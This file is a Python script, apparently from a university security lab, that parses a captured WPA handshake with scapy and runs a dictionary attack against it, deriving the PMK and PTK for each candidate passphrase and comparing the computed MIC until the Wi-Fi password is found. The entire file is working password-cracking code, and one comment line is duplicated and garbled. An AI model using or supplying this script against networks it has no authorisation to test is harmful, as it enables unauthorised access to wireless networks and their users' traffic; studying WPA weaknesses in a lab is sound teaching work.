#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex
from numpy import array_split
from numpy import array
import hmac, hashlib


wpa=rdpcap("wpa_handshake.cap")
dictionary = "dico.txt"

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

count = 0
ssid = "none"
APmac = "none"
Clientmac = "none"
ANonce = "none"
SNonce = "none"
mic_to_test = "none"
data = "none"

for trame in wpa:
  if trame.haslayer(Dot11Beacon):
    ssid = trame.info
    APmac = a2b_hex(str(trame.addr2.translate(None, ":")))
  if trame.haslayer(EAPOL):
    count = count + 1
    if(count == 1):
      nonce = str(trame.load.encode('hex')[26:26+64])
      ANonce=a2b_hex(nonce)
    if(count == 2):
      nonce = trame.load.encode('hex')[26:26+64]
      SNonce=a2b_hex(nonce)
    if(count == 4):
      Clientmac = a2b_hex(str(trame.addr2.translate(None, ":")))
      data = str(trame.load.encode('hex'))
      dataLength = len(data)
      mic_to_test = data[dataLength-36:dataLength-4]
      data = list(data)
      for i in range(dataLength-36,dataLength-4):
        data[i] = "0"
      data = "0103005f" + ''.join(data)
      data = a2b_hex(data)

A           = "Pairwise key expansion"
B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
#data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") 

with open(dictionary, "r") as dico:
  for word in dico:
    passPhrase = word.split("\n")[0]

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(a2b_hex(pmk),A,B)

    #calculate MIC over EAPOL payload (Michael)- The p#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic_calcu = hmac.new(ptk[0:16],data,hashlib.sha1)
    mic_calcu = mic_calcu.hexdigest()[:-8]

    if mic_calcu == mic_to_test:
      print("password is : "+ passPhrase)
      break
    else:
      print("password is not : "+ passPhrase)

